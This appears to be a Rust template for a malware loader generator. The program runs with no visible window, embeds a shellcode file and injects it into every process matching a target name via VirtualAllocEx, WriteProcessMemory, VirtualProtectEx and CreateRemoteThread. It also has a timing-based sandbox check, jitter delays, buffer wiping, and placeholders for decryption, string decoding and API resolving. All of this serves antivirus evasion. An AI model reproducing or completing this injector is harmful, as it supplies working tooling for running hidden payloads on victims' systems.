#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use windows::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Memory::VirtualAllocEx;
use windows::Win32::System::Memory::VirtualProtectEx;
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
use windows::Win32::System::Threading::CreateRemoteThread;
use windows::Win32::System::Threading::OpenProcess;
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
use std::include_bytes;
use std::time::{Duration, Instant};
use std::thread;

{{IMPORTS}}

{{SANDBOX_IMPORTS}}

{{DECRYPTION_FUNCTION}}

{{STR_DECODER}}

{{API_RESOLVER}}

fn {{FN_FIND_PID}}(tar: &str) -> Vec<usize> {
    let mut dom: Vec<usize> = Vec::new();
    let tar_lower = tar.to_lowercase();

    unsafe {
        let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(h) if h != INVALID_HANDLE_VALUE => h,
            _ => return dom,
        };

        let mut entry: PROCESSENTRY32W = core::mem::zeroed();
        entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
                let name = String::from_utf16_lossy(&entry.szExeFile[..len]);
                if name.to_lowercase() == tar_lower {
                    dom.push(entry.th32ProcessID as usize);
                }
                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);
    }

    dom
}

fn {{FN_PAUSE}}(ms: u64) {
    thread::sleep(Duration::from_millis(ms));
}

fn check_environment() -> bool {
    let start = Instant::now();
    {{FN_PAUSE}}(3000);
    start.elapsed().as_millis() >= 2500
}

fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
    }
    buf.clear();
}

fn {{FN_INJECT}}(mut buf: Vec<u8>, tar: usize) {
    unsafe {
        let h_process = match OpenProcess(PROCESS_ALL_ACCESS, false, tar as u32) {
            Ok(h) => h,
            Err(_) => return,
        };

        {{FN_PAUSE}}({{JITTER_1}});
        {{NT_DELAY_STEP}}

        let buf_len = buf.len();
        let result_ptr = VirtualAllocEx(h_process, None, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        {{FN_PAUSE}}({{JITTER_2}});
        {{NT_DELAY_STEP}}

        let mut byteswritten = 0;
        let _ = WriteProcessMemory(
            h_process,
            result_ptr,
            buf.as_ptr() as _,
            buf_len,
            Some(&mut byteswritten),
        );

        wipe(&mut buf);
        {{FN_PAUSE}}({{JITTER_3}});
        {{NT_DELAY_STEP}}

        let mut old_perms = PAGE_READWRITE;
        let _ = VirtualProtectEx(
            h_process,
            result_ptr,
            buf_len,
            PAGE_EXECUTE_READ,
            &mut old_perms,
        );

        {{FN_PAUSE}}({{JITTER_4}});
        {{NT_DELAY_STEP}}
        {{NT_DELAY_FINAL}}

        let _ = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(std::mem::transmute(result_ptr)),
            None,
            0,
            None,
        );
    }
}

fn main() {
    {{NT_DELAY_AT_START}}
    {{SANDBOX}}

    if !check_environment() { return; }

    let tar: &str = "{{TARGET_PROCESS}}";

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = buf.to_vec();

    {{MAIN}}

    let list: Vec<usize> = {{FN_FIND_PID}}(tar);
    if !list.is_empty() {
        for i in &list {
            {{FN_INJECT}}(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}
